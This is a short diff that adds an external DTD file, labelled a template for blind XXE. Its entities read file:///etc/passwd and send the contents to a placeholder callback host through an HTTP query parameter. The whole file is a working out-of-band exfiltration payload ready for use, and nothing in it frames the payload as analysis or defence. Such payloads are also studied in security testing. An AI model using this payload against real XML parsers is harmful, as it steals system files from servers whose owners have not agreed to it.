@@ -1,0 +1,6 @@
+<!-- External DTD template for blind XXE -->
+<!-- Replace CALLBACK_URL and FILE_PATH before use -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CALLBACK_URL/queue?exfil=%file;'>">
+%eval;
+%exfil;
